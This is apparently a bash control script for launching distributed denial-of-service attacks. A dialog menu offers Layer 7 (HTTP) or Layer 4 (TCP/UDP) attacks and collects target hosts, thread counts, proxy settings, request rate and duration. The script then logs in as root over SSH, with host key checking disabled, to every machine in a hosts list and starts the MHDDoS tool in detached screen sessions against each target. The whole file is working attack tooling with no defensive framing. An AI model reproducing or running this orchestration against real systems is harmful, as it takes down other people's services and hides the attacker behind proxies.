MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

case $MENU_OPTION in

1)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")
    targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
    printf "$targets" > "$SCRIPT_DIR/targets.txt"
    printf "\n" >> "$SCRIPT_DIR/targets.txt"
    targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
    threads=$(( 1000 / targets_num ))
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
    RPS=$(bash "${SCRIPT_DIR}/menus/rps.sh")
    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")

    clear
    printf "Starting L7 attack...\n"
    while read -r target; do
      echo "TARGET: $target"
      echo "THREADS: $threads"
      echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
      bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $SOCKS_TYPE $threads $PROXY_FILE $RPS $DURATION" \
       --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
    done < "$SCRIPT_DIR/targets.txt"

    ;;

2)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")
    targets=$(dialog --title 'Enter hosts or ip addresses with ports split by newline' --editbox "$SCRIPT_DIR/targets.txt" --stdout 35 70)
    printf "$targets" > "$SCRIPT_DIR/targets.txt"
    printf "\n" >> "$SCRIPT_DIR/targets.txt"
    targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
    threads=$(( 1000 / targets_num ))

    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")

    clear
    printf "Starting L4 attacks...\n"
    while read -r target; do
      echo "TARGET: $target"
      echo "THREADS: $threads"
      echo "COMMAND: screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
      bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" \
       --hostsfile "$SCRIPT_DIR/hosts.txt" --sshflags "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n"
    done < "$SCRIPT_DIR/targets.txt"
    sleep 2
    exit

    ;;


3)
    exit 0
    ;;

esac